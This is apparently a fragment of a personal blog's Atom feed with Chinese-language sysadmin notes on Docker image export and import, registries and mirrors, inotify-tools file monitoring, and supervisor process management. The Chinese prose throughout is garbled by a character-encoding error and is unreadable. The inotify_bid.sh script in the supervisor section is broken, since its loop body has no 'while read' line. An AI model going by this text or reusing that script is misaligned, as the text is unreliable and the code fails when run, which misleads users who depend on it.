<pre><code>docker export 7691a814370e &gt; ubuntu.tar
</code></pre><p>å¯¼å…¥</p>
<pre><code>cat ubuntu.tar | docker import - test/buntu:v1.0
</code></pre><p>é€šè¿‡å¯¼å…¥å¯¼å‡ºåŠŸèƒ½, å¯ä»¥å®ç°å®¹å™¨çš„è¿ç§»</p>
<p>æ€è€ƒ: é€šè¿‡docker import å¯¼å…¥äº§ç”Ÿçš„é•œåƒå’Œé€šè¿‡ docker load æ–‡ä»¶å¯¼å…¥çš„é•œåƒæœ‰ä»€ä¹ˆåŒºåˆ«</p>
<p>Tips:</p>
<p>å¦‚ä½•æ¸…ç†åå°åœæ­¢çš„å®¹å™¨ï¼Ÿ</p>
<p>å¯ä»¥ä½¿ç”¨ docker rm $(docker ps -a -q) å‘½ä»¤</p>
<p>å¦‚ä½•é€€å‡ºä¸€ä¸ªé•œåƒçš„bashï¼Œè€Œä¸ç»ˆæ­¢å®ƒï¼Ÿ</p>
<p>æŒ‰ Ctrl-p Ctrl-qã€‚</p>
<p>é€€å‡ºå®¹å™¨æ—¶å€™è‡ªåŠ¨åˆ é™¤?</p>
<p>ä½¿ç”¨ â€“rm é€‰é¡¹ï¼Œä¾‹å¦‚ sudo docker run â€“rm -it ubuntu</p>
<h4 id="u4ED3_u5E93"><a href="#u4ED3_u5E93" class="headerlink" title="ä»“åº“"></a>ä»“åº“</h4><p>ç™»é™†</p>
<figure class="highlight asciidoc"><table><tr><td class="code"><pre><span class="line">$ docker login</span><br><span class="line">Username: xeroth</span><br><span class="line">Password:</span><br><span class="line">Email: 123321@qq.com</span><br><span class="line"><span class="label">WARNING: </span>login credentials saved in /Users/cristaly7/.docker/config.json</span><br><span class="line">Login Succeeded</span><br></pre></td></tr></table></figure>
<p>æœç´¢é•œåƒ</p>
<pre><code>docker search centos

docker search -s 100 centos æ˜¾ç¤º100â­ï¸ä»¥ä¸Šçš„é•œåƒ
</code></pre><p>â­ï¸è‡ªåŠ¨åˆ›å»º(Automated Builds) </p>
<p>è‡ªåŠ¨åˆ›å»ºåŠŸèƒ½å¯¹äºéœ€è¦ç»å¸¸å‡çº§é•œåƒå†…ç¨‹åºæ¥è¯´ï¼Œååˆ†æ–¹ä¾¿ã€‚ æœ‰æ—¶å€™ï¼Œç”¨æˆ·åˆ›å»ºäº†é•œåƒï¼Œå®‰è£…äº†æŸä¸ªè½¯ä»¶ï¼Œå¦‚æœè½¯ä»¶å‘å¸ƒæ–°ç‰ˆæœ¬åˆ™éœ€è¦æ‰‹åŠ¨æ›´æ–°é•œåƒ<br>è€Œè‡ªåŠ¨åˆ›å»ºå…è®¸ç”¨æˆ·é€šè¿‡ Docker Hub æŒ‡å®šè·Ÿè¸ªä¸€ä¸ªç›®æ ‡ç½‘ç«™ï¼ˆç›®å‰æ”¯æŒ GitHub æˆ– BitBucketï¼‰ä¸Šçš„é¡¹ç›®ï¼Œä¸€æ—¦é¡¹ç›®å‘ç”Ÿæ–°çš„æäº¤ï¼Œåˆ™è‡ªåŠ¨æ‰§è¡Œåˆ›å»ºã€‚</p>
<p>å‚è€ƒèµ„æ–™:<br><a href="https://docs.docker.com/docker-hub/builds/" target="_blank" rel="external">https://docs.docker.com/docker-hub/builds/</a><br><a href="https://www.brianchristner.io/how-to-automate-docker-builds-end-to-end/" target="_blank" rel="external">https://www.brianchristner.io/how-to-automate-docker-builds-end-to-end/</a></p>
<h5 id="dockerpool"><a href="#dockerpool" class="headerlink" title="dockerpool"></a>dockerpool</h5><p>dockerpoolæ˜¯å›½å†…çš„ä¸€ä¸ª docker é•œåƒèµ„æºç½‘ç«™</p>
<p>ä¸‹è½½ä¸€ä¸ªé•œåƒè¯•è¯•</p>
<pre><code>docker pull dl.dockerpool.com:5000/ubuntu:12.04
</code></pre><p>æŠ¥é”™:</p>
<figure class="highlight groovy"><table><tr><td class="code"><pre><span class="line">docker pull dl.dockerpool.<span class="string">com:</span><span class="number">5000</span>/<span class="string">centos:</span><span class="number">7</span></span><br><span class="line">Error response from <span class="string">daemon:</span> unable to ping registry endpoint <span class="string">https:</span><span class="comment">//dl.dockerpool.com:5000/v0/</span></span><br><span class="line">v2 ping attempt failed with <span class="string">error:</span> Get <span class="string">https:</span><span class="comment">//dl.dockerpool.com:5000/v2/: tls: oversized record received with length 28012</span></span><br><span class="line"> v1 ping attempt failed with <span class="string">error:</span> Get <span class="string">https:</span><span class="comment">//dl.dockerpool.com:5000/v1/_ping: tls: oversized record received with length 28012</span></span><br></pre></td></tr></table></figure>
<p>è§£å†³æ–¹æ³•:</p>
<p>æŸ¥çœ‹è™šæ‹Ÿæœºåå­—</p>
<figure class="highlight sqf"><table><tr><td class="code"><pre><span class="line">docker-machine ls</span><br><span class="line"><span class="built_in">NAME</span>      ACTIVE   <span class="built_in">DRIVER</span>       STATE     URL                         SWARM   DOCKER   ERRORS</span><br><span class="line"><span class="keyword">default</span>   *        virtualbox   Running   tcp:<span class="comment">//192.168.99.100:2376           v1.9.1</span></span><br></pre></td></tr></table></figure>
<p>è¿›å…¥docker è™šæ‹Ÿæœº</p>
<pre><code>docker-machine ssh default
</code></pre><p>åœ¨default è™šæ‹Ÿæœºé‡Œä¿®æ”¹ <em>/var/lib/boot2docker/profile</em> æ–‡ä»¶, åœ¨<strong>EXTRA_ARGS=</strong>é‡ŒåŠ å…¥:<br><em>â€“insecure-registry dl.dockerpool.com:5000</em></p>
<p>é‡å¯ vm</p>
<pre><code>docker-machine restart default
</code></pre><p>å†æ¬¡è¿è¡Œdocker pull dl.dockerpool.com:5000/ubuntu:12.04 å°±å¯ä»¥äº†</p>
<p>ä¸‹è½½å®Œæˆå:</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">docker images</span><br><span class="line">REPOSITORY                      TAG                 IMAGE ID            CREATED             VIRTUAL SIZE</span><br><span class="line">xeroth/sinatra                  v2                  <span class="number">1</span>a6a1230cfe3        <span class="number">3</span> days ago          <span class="number">319.4</span> MB</span><br><span class="line">ubuntu                          <span class="number">14.04</span>               af88597ec24b        <span class="number">8</span> days ago          <span class="number">187.9</span> MB</span><br><span class="line">ubuntu                          latest              af88597ec24b        <span class="number">8</span> days ago          <span class="number">187.9</span> MB</span><br><span class="line">nginx                           latest              <span class="number">813e3731</span>b203        <span class="number">3</span> weeks ago         <span class="number">133.9</span> MB</span><br><span class="line">hello-world                     latest              <span class="number">0</span>a6ba66e537a        <span class="number">3</span> months ago        <span class="number">960</span> B</span><br><span class="line">dl.dockerpool.com:<span class="number">5000</span>/ubuntu   <span class="number">12.04</span>               <span class="number">0</span>b310e6bf058        <span class="number">14</span> months ago       <span class="number">126.7</span> MB</span><br></pre></td></tr></table></figure>
<p>ä¿®æ”¹ tag</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">$ docker tag dl.dockerpool.com:<span class="number">5000</span>/ubuntu:<span class="number">12.04</span> ubuntu:<span class="number">12.04</span></span><br><span class="line">$ /Users/cristaly7 &gt;docker images</span><br><span class="line">REPOSITORY                      TAG                 IMAGE ID            CREATED             VIRTUAL SIZE</span><br><span class="line">xeroth/sinatra                  v2                  <span class="number">1</span>a6a1230cfe3        <span class="number">3</span> days ago          <span class="number">319.4</span> MB</span><br><span class="line">ubuntu                          <span class="number">14.04</span>               af88597ec24b        <span class="number">8</span> days ago          <span class="number">187.9</span> MB</span><br><span class="line">ubuntu                          latest              af88597ec24b        <span class="number">8</span> days ago          <span class="number">187.9</span> MB</span><br><span class="line">nginx                           latest              <span class="number">813e3731</span>b203        <span class="number">3</span> weeks ago         <span class="number">133.9</span> MB</span><br><span class="line">hello-world                     latest              <span class="number">0</span>a6ba66e537a        <span class="number">3</span> months ago        <span class="number">960</span> B</span><br><span class="line">ubuntu                          <span class="number">12.04</span>               <span class="number">0</span>b310e6bf058        <span class="number">14</span> months ago       <span class="number">126.7</span> MB</span><br><span class="line">dl.dockerpool.com:<span class="number">5000</span>/ubuntu   <span class="number">12.04</span>               <span class="number">0</span>b310e6bf058        <span class="number">14</span> months ago       <span class="number">126.7</span> MB</span><br></pre></td></tr></table></figure>
<h5 id="u2B50_uFE0Fdocker__u955C_u50CF_u52A0_u901F_u7F51_u7AD9"><a href="#u2B50_uFE0Fdocker__u955C_u50CF_u52A0_u901F_u7F51_u7AD9" class="headerlink" title="â­ï¸docker é•œåƒåŠ é€Ÿç½‘ç«™"></a>â­ï¸docker é•œåƒåŠ é€Ÿç½‘ç«™</h5><p>å‘ç°äº†è¿™ä¸ª, æ„Ÿè§‰ dockerpool ç™½å¼„äº†ğŸ˜‚</p>
<p>å›½å†…çš„æœ‰ <a href="http://dockerpool.com/article/1419997003" target="_blank" rel="external">DaoCloud</a> è¿˜æœ‰é˜¿é‡Œçš„, æˆ‘æ­¤åˆ»ç”¨çš„æ˜¯é˜¿é‡ŒTAE2.0çš„<a href="http://tae.taobao.com/mirror/index.html?#/docker/speed/stat" target="_blank" rel="external">dockeråŠ é€Ÿå™¨</a></p>
<p>ä½¿ç”¨æ–¹æ³•ä¹Ÿå¾ˆç®€å•, ç™»é™†é˜¿é‡Œ, è·å–åˆ†é…çš„é•œåƒåœ°å€, è·Ÿä¸Šé¢æŠ˜è…¾ dockerpool ä¸€æ ·è¿›å…¥ vm, ä¿®æ”¹æ–‡ä»¶<em>/var/lib/boot2docker/profile</em>, åœ¨EXTRA_ARGS=é‡ŒåŠ å…¥:<em>â€“registry-mirror=<a href="http://6tgwmnjm.mirror.aliyun.com" target="_blank" rel="external">http://6tgwmnjm.mirror.aliyun.com</a></em></p>
<p>çœŸæ˜¯é£ä¸€èˆ¬çš„æ„Ÿè§‰å•Š! å¦ˆå¦ˆå†ä¹Ÿä¸ç”¨æ‹…å¿ƒæˆ‘ docker çš„ä¸Šä¼ ä¸‹è½½äº† , è°¢è°¢ TAE</p>
<h5 id="u2B50_uFE0F_u79C1_u6709_u4ED3_u5E93"><a href="#u2B50_uFE0F_u79C1_u6709_u4ED3_u5E93" class="headerlink" title="â­ï¸ç§æœ‰ä»“åº“"></a>â­ï¸ç§æœ‰ä»“åº“</h5><p><a href="http://www.a-ho.com/2016/01/15/Dockerç§æœ‰ä»“åº“/" target="_blank" rel="external">æ­å»ºç§æœ‰ä»“åº“</a>   </p>
<h4 id="u6570_u636E_u5377"><a href="#u6570_u636E_u5377" class="headerlink" title="æ•°æ®å·"></a>æ•°æ®å·</h4><p><a href="http://www.a-ho.com/2016/01/23/Dockeræ•°æ®å·/" target="_blank" rel="external">Docker æ•°æ®å·</a></p>
<h4 id="u5BB9_u5668_u4E92_u901A"><a href="#u5BB9_u5668_u4E92_u901A" class="headerlink" title="å®¹å™¨äº’é€š"></a>å®¹å™¨äº’é€š</h4><p><a href="http://www.a-ho.com/2016/01/24/å®¹å™¨é—´é€šä¿¡/" target="_blank" rel="external">å®¹å™¨é—´é€šä¿¡</a></p>
<h4 id="Dockerfile"><a href="#Dockerfile" class="headerlink" title="Dockerfile"></a>Dockerfile</h4><p>[]</p>
<p><a href="http://www.cnblogs.com/programfish/p/4101884.html" target="_blank" rel="external">CMD ä¸ ENTRYPOINT çš„åŒºåˆ«</a></p>
<h4 id="To_be_continue"><a href="#To_be_continue" class="headerlink" title="To be continue .."></a>To be continue ..</h4><p>Reference:</p>
<p><a href="https://github.com/docker/toolbox/issues/83" target="_blank" rel="external">docker pull è¯ä¹¦æŠ¥é”™</a></p>
<p><a href="https://www.gitbook.com/book/philipzheng/docker_practice/details" target="_blank" rel="external">Docker â€”â€” å¾å…¥é–€åˆ°å¯¦è¸Â­</a></p>
]]></content>
    <summary type="html">
    <![CDATA[<hr>
<p>ç¯å¢ƒ:</p>
<ul>
<li>Mac OS X 10.11</li>
<li>Ubuntu 14.04</li>
<li>Docker Toolså®‰è£…</li>
</ul>
<p>è®°å½•ä¸€ä¸‹ docker çš„å­¦ä¹ å†ç¨‹, ä¸‰å¤§åŸºç¡€æ¦‚å¿µå·²ç»åŸºæœ¬äº†è§£, ç„¶åä¸‹ä¸€æ­¥æœ‰ç‚¹è¿·èŒ«, è™½ç„¶è¿·èŒ«, ä½†æ˜¯ä¸èƒ½æ­¢æ­¥ä¸å‰, äºæ˜¯æˆ‘å†³å®šå…ˆç”¨æœ€ç¬¨çš„æ–¹æ³•, æŒ‰ä¹¦ä¸Šè¯´çš„åšä¸€éå§â€¦, è™½ç„¶çœ‹èµ·æ¥éƒ½æ‡‚, ä½†æ˜¯ä¸åšæ„Ÿè§‰ä¸è¸å®å•Š - -<br>]]>
    
    </summary>
    
      <category term="Docker" scheme="http://yoursite.com/tags/Docker/"/>
    
      <category term="it" scheme="http://yoursite.com/categories/it/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[inotify ç›‘æ§æ–‡ä»¶å’Œç›®å½•å˜åŒ–]]></title>
    <link href="http://yoursite.com/2016/05/11/inotify-%E7%9B%91%E6%8E%A7%E6%96%87%E4%BB%B6%E5%92%8C%E7%9B%AE%E5%BD%95%E5%8F%98%E5%8C%96/"/>
    <id>http://yoursite.com/2016/05/11/inotify-ç›‘æ§æ–‡ä»¶å’Œç›®å½•å˜åŒ–/</id>
    <published>2016-05-11T01:49:32.000Z</published>
    <updated>2016-06-23T01:01:57.000Z</updated>
    <content type="html"><![CDATA[<h3 id="u672C_u6765_u6253_u7B97_u628A_u8981_u76D1_u63A7_u7684_u6587_u4EF6_u653E_mysql_2C__u901A_u8FC7_u76D1_u63A7_mysql__u5B9E_u73B0"><a href="#u672C_u6765_u6253_u7B97_u628A_u8981_u76D1_u63A7_u7684_u6587_u4EF6_u653E_mysql_2C__u901A_u8FC7_u76D1_u63A7_mysql__u5B9E_u73B0" class="headerlink" title="æœ¬æ¥æ‰“ç®—æŠŠè¦ç›‘æ§çš„æ–‡ä»¶æ”¾ mysql, é€šè¿‡ç›‘æ§ mysql å®ç°"></a>æœ¬æ¥æ‰“ç®—æŠŠè¦ç›‘æ§çš„æ–‡ä»¶æ”¾ mysql, é€šè¿‡ç›‘æ§ mysql å®ç°</h3><pre><code>å¹¿å·-kali  17:06:13
mysql èƒ½ä¸èƒ½è®¾ç½®è¿™æ ·çš„åŠŸèƒ½:  æŸ¥è¯¢æŸä¸ªè¡¨çš„æŸä¸ªå­—æ®µå°±è§¦å‘æŠ¥è­¦è„šæœ¬
åŒ—äº¬-é’å±±  17:08:22
.mysql_history 
åŒ—äº¬-é’å±±  17:08:53
é»˜è®¤ä½ è¿æ¥mysqlåæ‰§è¡Œçš„å‘½ä»¤è¿™ä¸ªæ–‡ä»¶é‡Œä¼šæœ‰è®°å½•ï¼Œä½ å¯ä»¥å‘å‘Šè­¦ï¼Œä¸è¿‡æ˜¯äº‹å
åŒ—äº¬-é’å±±  17:09:19
ä¸è¿‡è¿™ä¸ªæ˜¯åœ¨æœåŠ¡å™¨ä¸Šæ“ä½œæ—¶çš„å‘Šè­¦
åŒ—äº¬-é’å±±  17:09:33
è¿œç¨‹odbcè¿æ¥çš„è¯é‡Œé¢æ²¡æœ‰
åŒ—äº¬-é’å±±  17:10:14
binlogæ—¥å¿—é‡Œåº”è¯¥å¯ä»¥æå–å‡ºæ¥

å¹¿å·-å°ç‹-Vip  17:19:42
å»ºä¸ªè§¦å‘å™¨å¯è¡Œï¼Ÿselectçš„ä¸çŸ¥é“èƒ½å¦åˆ¤æ–­ï¼Œæ²¡ç ”ç©¶è¿‡
åŒ—äº¬-é’å±±  17:20:05
selectä¸è¡Œï¼Œdelete\updateå¯ä»¥
</code></pre><p>ä½†æ˜¯ç½‘ä¸Šæœ‰çš„è¯´æŸ¥çœ‹æ­£åœ¨å†™å…¥çš„ binlog ä¼šæœ‰ä¸è‰¯åæœâ€¦ , æ‰€ä»¥å¦å¯»ä»–æ³•, æƒ³èµ·äº†ä»¥å‰åšæ–‡ä»¶åŒæ­¥æ—¶å€™ç”¨çš„ inotify</p>
<h3 id="u5B89_u88C5_u4F7F_u7528_inotify-tools"><a href="#u5B89_u88C5_u4F7F_u7528_inotify-tools" class="headerlink" title="å®‰è£…ä½¿ç”¨ inotify-tools"></a>å®‰è£…ä½¿ç”¨ inotify-tools</h3><p>é¦–å…ˆæŸ¥çœ‹ç³»ç»Ÿå†…æ ¸æ”¯ä¸æ”¯æŒ inotify</p>
<pre><code># grep INOTIFY_USER /boot/config-$(uname -r)
CONFIG_INOTIFY_USER=y
</code></pre><p>inotify æ˜¯ç”¨ C çš„, ä½œä¸ºä¸€åªèœé¸Ÿ sa, æˆ‘ç”¨ç”¨å°è£…å¥½çš„inotify-tools å°±å¤Ÿäº†~</p>
<p>å®‰è£…</p>
<pre><code>yum -y install inotify-tools
</code></pre><p>çœ‹çœ‹ç›‘æ§/root  ç›®å½•çš„æ•ˆæœ, åœ¨ä¸€ä¸ªç»ˆç«¯è¾“å…¥å¦‚ä¸‹å‘½ä»¤, å¦ä¸€ä¸ªç»ˆç«¯åšæµ‹è¯•, æ¯”å¦‚cat a.txt:</p>
<pre><code>[root@node1 ~]# inotifywait -mrq --timefmt &apos;%d/%m/%y %H:%M&apos; --format &apos;%T %w%f %e&apos; -e access,move,modify,delete,create,attrib /root
11/05/16 10:54 /root/a.txt ACCESS
</code></pre><p>åˆ©ç”¨ç®¡é“å°±èƒ½è§¦å‘å˜æ›´æ“ä½œ:</p>
<pre><code>[root@node1 ~]# inotifywait -mrq --timefmt &apos;%d/%m/%y %H:%M&apos; --format &apos;%T %w%f %e&apos; -e access,move,modify,delete,create,attrib /root | while read line; do echo &quot;sb. is doing sth.&quot; ; done
</code></pre><p>æƒ³æ’é™¤ç›‘æ§è·¯å¾„, åŠ â€“exclude å‚æ•°</p>
<p><a href="https://www.centos.bz/2012/06/inotify-tools-introduction/" target="_blank" rel="external">inotify-toolsä½¿ç”¨æ–¹æ³•ä»‹ç»</a></p>
]]></content>
    <summary type="html">
    <![CDATA[<h3 id="u672C_u6765_u6253_u7B97_u628A_u8981_u76D1_u63A7_u7684_u6587_u4EF6_u653E_mysql_2C__u901A_u8FC7_u76D1_u63A7_mysql__u5B9E_u73B0"><a hre]]>
    </summary>
    
      <category term="inotify" scheme="http://yoursite.com/tags/inotify/"/>
    
      <category term="it" scheme="http://yoursite.com/categories/it/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[ä½¿ç”¨ supervisor ç®¡ç†è¿›ç¨‹]]></title>
    <link href="http://yoursite.com/2016/05/11/%E4%BD%BF%E7%94%A8-supervisor-%E7%AE%A1%E7%90%86%E8%BF%9B%E7%A8%8B/"/>
    <id>http://yoursite.com/2016/05/11/ä½¿ç”¨-supervisor-ç®¡ç†è¿›ç¨‹/</id>
    <published>2016-05-11T01:08:17.000Z</published>
    <updated>2016-05-25T01:13:50.000Z</updated>
    <content type="html"><![CDATA[<h3 id="u5B89_u88C5_uFF08Centos_uFF09_uFF1A"><a href="#u5B89_u88C5_uFF08Centos_uFF09_uFF1A" class="headerlink" title="å®‰è£…ï¼ˆCentosï¼‰ï¼š"></a>å®‰è£…ï¼ˆCentosï¼‰ï¼š</h3><pre><code>yum install python-setuptools

easy_install supervisor
</code></pre><p>æµ‹è¯•æ˜¯å¦å®‰è£…æˆåŠŸï¼š</p>
<pre><code>echo_supervisord_conf
</code></pre><p>ä¼šæ˜¾ç¤ºä»¥ä¸‹å†…å®¹ï¼Œå…¶å®æ˜¯ä¸€ä¸ªé…ç½®æ¨¡ç‰ˆ:</p>
<pre><code>; Sample supervisor config file.
;
; For more information on the config file, please see:
; http://supervisord.org/configuration.html
;
; Notes:
;  - Shell expansion (&quot;~&quot; or &quot;$HOME&quot;) is not supported.  Environment
;    variables can be expanded using this syntax: &quot;%(ENV_HOME)s&quot;.
;  - Comments must have a leading space: &quot;a=b ;comment&quot; not &quot;a=b;comment&quot;.

[unix_http_server]
file=/tmp/supervisor.sock   ; (the path to the socket file)
;chmod=0700                 ; socket file mode (default 0700)
;chown=nobody:nogroup       ; socket file uid:gid owner
;username=user              ; (default is no username (open server))
;password=123               ; (default is no password (open server))

;[inet_http_server]         ; inet (TCP) server disabled by default
;port=127.0.0.1:9001        ; (ip_address:port specifier, *:port for all iface)
;username=user              ; (default is no username (open server))
;password=123               ; (default is no password (open server))

[supervisord]
logfile=/tmp/supervisord.log ; (main log file;default $CWD/supervisord.log)
logfile_maxbytes=50MB        ; (max main logfile bytes b4 rotation;default 50MB)
logfile_backups=10           ; (num of main logfile rotation backups;default 10)
loglevel=info                ; (log level;default info; others: debug,warn,trace)
pidfile=/tmp/supervisord.pid ; (supervisord pidfile;default supervisord.pid)
nodaemon=false               ; (start in foreground if true;default false)
minfds=1024                  ; (min. avail startup file descriptors;default 1024)
minprocs=200                 ; (min. avail process descriptors;default 200)
;umask=022                   ; (process file creation umask;default 022)
;user=chrism                 ; (default is current user, required if root)
;identifier=supervisor       ; (supervisord identifier, default is &apos;supervisor&apos;)
;directory=/tmp              ; (default is not to cd during start)
;nocleanup=true              ; (don&apos;t clean up tempfiles at start;default false)
;childlogdir=/tmp            ; (&apos;AUTO&apos; child log dir, default $TEMP)
;environment=KEY=&quot;value&quot;     ; (key value pairs to add to environment)
;strip_ansi=false            ; (strip ansi escape codes in logs; def. false)

; the below section must remain in the config file for RPC
; (supervisorctl/web interface) to work, additional interfaces may be
; added by defining them in separate rpcinterface: sections
[rpcinterface:supervisor]
supervisor.rpcinterface_factory = supervisor.rpcinterface:make_main_rpcinterface

[supervisorctl]
serverurl=unix:///tmp/supervisor.sock ; use a unix:// URL  for a unix socket
;serverurl=http://127.0.0.1:9001 ; use an http:// url to specify an inet socket
;username=chris              ; should be same as http_username if set
;password=123                ; should be same as http_password if set
;prompt=mysupervisor         ; cmd line prompt (default &quot;supervisor&quot;)
;history_file=~/.sc_history  ; use readline history if available

; The below sample program section shows all possible program subsection values,
; create one or more &apos;real&apos; program: sections to be able to control them under
; supervisor.

;[program:theprogramname]
;command=/bin/cat              ; the program (relative uses PATH, can take args)
;process_name=%(program_name)s ; process_name expr (default %(program_name)s)
;numprocs=1                    ; number of processes copies to start (def 1)
;directory=/tmp                ; directory to cwd to before exec (def no cwd)
;umask=022                     ; umask for process (default None)
;priority=999                  ; the relative start priority (default 999)
;autostart=true                ; start at supervisord start (default: true)
;startsecs=1                   ; # of secs prog must stay up to be running (def. 1)
;startretries=3                ; max # of serial start failures when starting (default 3)
;autorestart=unexpected        ; when to restart if exited after running (def: unexpected)
;exitcodes=0,2                 ; &apos;expected&apos; exit codes used with autorestart (default 0,2)
;stopsignal=QUIT               ; signal used to kill process (default TERM)
;stopwaitsecs=10               ; max num secs to wait b4 SIGKILL (default 10)
;stopasgroup=false             ; send stop signal to the UNIX process group (default false)
;killasgroup=false             ; SIGKILL the UNIX process group (def false)
;user=chrism                   ; setuid to this UNIX account to run the program
;redirect_stderr=true          ; redirect proc stderr to stdout (default false)
;stdout_logfile=/a/path        ; stdout log path, NONE for none; default AUTO
;stdout_logfile_maxbytes=1MB   ; max # logfile bytes b4 rotation (default 50MB)
;stdout_logfile_backups=10     ; # of stdout logfile backups (default 10)
;stdout_capture_maxbytes=1MB   ; number of bytes in &apos;capturemode&apos; (default 0)
;stdout_events_enabled=false   ; emit events on stdout writes (default false)
;stderr_logfile=/a/path        ; stderr log path, NONE for none; default AUTO
;stderr_logfile_maxbytes=1MB   ; max # logfile bytes b4 rotation (default 50MB)
;stderr_logfile_backups=10     ; # of stderr logfile backups (default 10)
;stderr_capture_maxbytes=1MB   ; number of bytes in &apos;capturemode&apos; (default 0)
;stderr_events_enabled=false   ; emit events on stderr writes (default false)
;environment=A=&quot;1&quot;,B=&quot;2&quot;       ; process environment additions (def no adds)
;serverurl=AUTO                ; override serverurl computation (childutils)

; The below sample eventlistener section shows all possible
; eventlistener subsection values, create one or more &apos;real&apos;
; eventlistener: sections to be able to handle event notifications
; sent by supervisor.

;[eventlistener:theeventlistenername]
;command=/bin/eventlistener    ; the program (relative uses PATH, can take args)
;process_name=%(program_name)s ; process_name expr (default %(program_name)s)
;numprocs=1                    ; number of processes copies to start (def 1)
;events=EVENT                  ; event notif. types to subscribe to (req&apos;d)
;buffer_size=10                ; event buffer queue size (default 10)
;directory=/tmp                ; directory to cwd to before exec (def no cwd)
;umask=022                     ; umask for process (default None)
;priority=-1                   ; the relative start priority (default -1)
;autostart=true                ; start at supervisord start (default: true)
;startsecs=1                   ; # of secs prog must stay up to be running (def. 1)
;startretries=3                ; max # of serial start failures when starting (default 3)
;autorestart=unexpected        ; autorestart if exited after running (def: unexpected)
;exitcodes=0,2                 ; &apos;expected&apos; exit codes used with autorestart (default 0,2)
;stopsignal=QUIT               ; signal used to kill process (default TERM)
;stopwaitsecs=10               ; max num secs to wait b4 SIGKILL (default 10)
;stopasgroup=false             ; send stop signal to the UNIX process group (default false)
;killasgroup=false             ; SIGKILL the UNIX process group (def false)
;user=chrism                   ; setuid to this UNIX account to run the program
;redirect_stderr=false         ; redirect_stderr=true is not allowed for eventlisteners
;stdout_logfile=/a/path        ; stdout log path, NONE for none; default AUTO
;stdout_logfile_maxbytes=1MB   ; max # logfile bytes b4 rotation (default 50MB)
;stdout_logfile_backups=10     ; # of stdout logfile backups (default 10)
;stdout_events_enabled=false   ; emit events on stdout writes (default false)
;stderr_logfile=/a/path        ; stderr log path, NONE for none; default AUTO
;stderr_logfile_maxbytes=1MB   ; max # logfile bytes b4 rotation (default 50MB)
;stderr_logfile_backups=10     ; # of stderr logfile backups (default 10)
;stderr_events_enabled=false   ; emit events on stderr writes (default false)
;environment=A=&quot;1&quot;,B=&quot;2&quot;       ; process environment additions
;serverurl=AUTO                ; override serverurl computation (childutils)

; The below sample group section shows all possible group values,
; create one or more &apos;real&apos; group: sections to create &quot;heterogeneous&quot;
; process groups.

;[group:thegroupname]
;programs=progname1,progname2  ; each refers to &apos;x&apos; in [program:x] definitions
;priority=999                  ; the relative start priority (default 999)

; The [include] section can just contain the &quot;files&quot; setting.  This
; setting can list multiple files (separated by whitespace or
; newlines).  It can also contain wildcards.  The filenames are
; interpreted as relative to this file.  Included files *cannot*
; include files themselves.

;[include]
;files = relative/directory/*.ini
</code></pre><h3 id="u914D_u7F6E"><a href="#u914D_u7F6E" class="headerlink" title="é…ç½®"></a>é…ç½®</h3><p>åˆ›å»ºé…ç½®æ–‡ä»¶ï¼š</p>
<pre><code>echo_supervisord_conf &gt; /etc/supervisord.conf
</code></pre><h4 id="u914D_u7F6E_u76D1_u63A7_u4E00_u4E2A_u547D_u4EE4_u7684_u8FDB_u7A0B"><a href="#u914D_u7F6E_u76D1_u63A7_u4E00_u4E2A_u547D_u4EE4_u7684_u8FDB_u7A0B" class="headerlink" title="é…ç½®ç›‘æ§ä¸€ä¸ªå‘½ä»¤çš„è¿›ç¨‹"></a>é…ç½®ç›‘æ§ä¸€ä¸ªå‘½ä»¤çš„è¿›ç¨‹</h4><p>æ¯”å¦‚æœ‰ä¸ªè„šæœ¬, ç”¨æ¥ç›‘æ§æ–‡ä»¶å˜åŒ– ,å‘æŠ¥è­¦çš„:</p>
<pre><code># cat  /root/shell/inotify_bid.sh
#!/bin/bash

PHP=/usr/bin/php
ALARM=/home/www/app/command/alarm.php
LOG=/data/bid_inotify.log
DIR=&quot;/data/app_upload_files/file /data/app_upload_files/file_bak/&quot;

/bin/inotifywait -mrq --timefmt &apos;%d/%m/%y %H:%M&apos; --format &apos;%T %w%f %e&apos; -e access,modify,delete,attrib $DIR
do
    echo $line |tee $LOG &gt;&gt; /root/shell/bid_inotify.log
    $PHP  $ALARM
done
</code></pre><p>æ€•è¿™ä¸ªåå°è¿è¡ŒæŒ‚æ‰, æ‰€ä»¥ç”¨ supervisor æ¥åšç›‘æ§:</p>
<p>å†é…ç½® <code>/etc/supervisord.conf</code>  </p>
<pre><code>[program:inotify_bid]
directory = /root/shell/ ; ç¨‹åºçš„å¯åŠ¨ç›®å½•, æ‰§è¡Œå‘½ä»¤å‰è¿›å…¥çš„ç›®å½•
command = /root/shell/inotify_bid.sh  ; å¯åŠ¨å‘½ä»¤ï¼Œå¯ä»¥çœ‹å‡ºä¸æ‰‹åŠ¨åœ¨å‘½ä»¤è¡Œå¯åŠ¨çš„å‘½ä»¤æ˜¯ä¸€æ ·çš„
autostart = true     ; åœ¨ supervisord å¯åŠ¨çš„æ—¶å€™ä¹Ÿè‡ªåŠ¨å¯åŠ¨
startsecs = 5        ; å¯åŠ¨ 5 ç§’åæ²¡æœ‰å¼‚å¸¸é€€å‡ºï¼Œå°±å½“ä½œå·²ç»æ­£å¸¸å¯åŠ¨äº†
autorestart = true   ; ç¨‹åºå¼‚å¸¸é€€å‡ºåè‡ªåŠ¨é‡å¯
startretries = 3     ; å¯åŠ¨å¤±è´¥è‡ªåŠ¨é‡è¯•æ¬¡æ•°ï¼Œé»˜è®¤æ˜¯ 3
redirect_stderr = true  ; æŠŠ stderr é‡å®šå‘åˆ° stdoutï¼Œé»˜è®¤ false
stdout_logfile_maxbytes = 20MB  ; stdout æ—¥å¿—æ–‡ä»¶å¤§å°ï¼Œé»˜è®¤ 50MB
stdout_logfile_backups = 20     ; stdout æ—¥å¿—æ–‡ä»¶å¤‡ä»½æ•°
; stdout æ—¥å¿—æ–‡ä»¶ï¼Œéœ€è¦æ³¨æ„å½“æŒ‡å®šç›®å½•ä¸å­˜åœ¨æ—¶æ— æ³•æ­£å¸¸å¯åŠ¨ï¼Œæ‰€ä»¥éœ€è¦æ‰‹åŠ¨åˆ›å»ºç›®å½•ï¼ˆsupervisord ä¼šè‡ªåŠ¨åˆ›å»ºæ—¥å¿—æ–‡ä»¶ï¼‰
stdout_logfile = /tmp/inotify_bid_stdout.log
</code></pre><p>æ¯å½“ä¿®æ”¹äº†å‘½ä»¤çš„æ—¶å€™, è¦é‡å¯ä¸€ä¸‹program:</p>
